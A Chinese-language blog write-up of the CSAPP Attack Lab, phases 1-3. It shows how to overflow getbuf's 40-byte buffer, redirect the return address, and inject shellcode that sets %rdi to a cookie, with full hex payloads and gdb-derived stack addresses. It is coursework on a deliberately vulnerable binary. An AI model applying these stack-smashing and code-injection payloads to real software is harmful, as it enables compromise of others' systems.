---
title: CSAPP Lab 4 - Attack Lab 实验解析
date: 2026-02-11 21:59:18
tags: [CSAPP, Attack, Systems Programming, GDB]
categories: [CSAPP]
---

## 任务一

首先使用`objdump -d ctarget > ctarget.s`进行反汇编，然后通过搜素找到`getbuf`的汇编代码。

![](/images/CSAPPLab4picture/getbuf.png)

根据汇编代码，可以知道栈空间的大小是40个字节，当输入的内容多于40个字节时，就会出现缓冲区溢出。所以我们先输入40个字节的占位字符，然后在后面输入`touch1`的地址，在栈空间释放之后，`getbuf`的返回地址修就会被改为`touch1`函数的入口地址。

![](/images/CSAPPLab4picture/touch1.png)

通过查找，找到了`touch1`的首地址，根据小端序规则，该地址为`c0 17 40 00`
然后把输入的内容写入`ans1.txt`（不能出现`0xa`，否则`Get`会直接返回）。最终写入是：`AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA c0 17 40 00 00 00 00 00`

*注1*：因为未知的原因，在使用本地Linux输入答案是会返回预期之外的错误结果，但是使用虚仿平台的虚拟机是正确的输出。个人猜测和Ubuntu的版本有关，或者本地缺少必要的环境。

*注2*：注1是当时做实验的时候的推测，现在看来应该是Ubuntu版本的问题，如果遇到了和我类似的问题建议在虚仿平台继续实验或者在本地下载20版之前的Ubuntu。

## 任务二

根据题目的要求，要实现进入`touch2`函数的`validate`分支，通过`touch2`的内容，可以知道需要做的是把变量`cookie`的值传给第一个参数，也就是传给`%rdi`寄存器。这一操作对应的汇编代码是`movq $0x59b997fa , %rdi`。

查看汇编代码可以知道`touch2`的首地址，根据小端序规则，是`ec 17 40 00`。
现在，就得到了与需要注入的代码等价的汇编代码：
```x86asm
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```
把这段代码写入`task2.s`中，指导书的第4部分《如何生成字节码》中的说明，使用命令`gcc -c task2.s`和`objdump -d task2.o`，获取机器指令所对应的二进制数据。

![](/images/CSAPPLab4picture/task2.png)

接下来，需要设法让程序执行注入的代码。把这段程序当作`getbuf`输入的字符，输入进`getbuf`函数的栈帧中，再使用缓冲区溢出的方法，将`ret`的返回地址设置为缓冲区的入口地址。输入的起始地址是在`getbuf`的栈底，所以我们可以将攻击代码放到`getbuf`的栈底。
使用gdb调试，`b *0x4017ac ` 在分配栈帧之后打一个断点，然后 `p $rsp`查看栈顶指针的位置，是`0x5561dc78`。
根据小端序规则，把需要注入的代码放在输入的开头，不足40个字节的用00占位，最后输入需要跳转位置的地址，得到答案：
```
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

## 任务三

首先分析函数调用的逻辑，通过`strncmp`函数比较比较`cookie`和第二个参数的前9位是否相同（`cookie`有8位，第九位是串尾符'\0'），如果相同则成功调用`touch3`函数的`validate`分支。
注意到`hexmatch`使用了随机函数，而且题目提示了当`hexmatch`和`strncmp`函数被调用时，会有数据入栈。所以考虑把注入代码要放在一个安全的位置。可以把它放到test的栈帧中。
在`getbuf`分配栈帧之前打一个断点`b *0x4017a8`，运行代码，然后`p $rsp`得到`text`的rsp地址现在为`0x5561dca0`，也是需要传入`touch3`的参数。查询`touch3`的首地址是`0x4018fa`。参考任务二的操作如法炮制，得到汇编代码：
```x86asm
movq    $0x5561dca8, %rdi
pushq   $0x4018fa
ret
```
并得到汇编代码的字节级表示。

![](/images/CSAPPLab4picture/task3.png)

下面开始处理`cookie`，`0x59b997fa`作为字符串转换为ASCII为：`35 39 62 39 39 37 66 61`。
由于在`test`栈帧中多利用了一个字节存放`cookie`，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放`cookie`的ASCII 。于是得到如下输入：
```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

至此我们完成了注入攻击

![](/images/CSAPPLab4picture/final.png)

## 总结
Attack和Bomb所需要的工具和技术手段类似，此外还需要对缓冲区相关知识的基础，整体而言难度比Bomb小一点。
*免责声明*：
本文的解析参考了[TJU Course Sharing](https://cs.tjuse.com/zh-CN/)中的部分内容，并借助AI工具进行整理。
解析仅供参考，不得抄袭！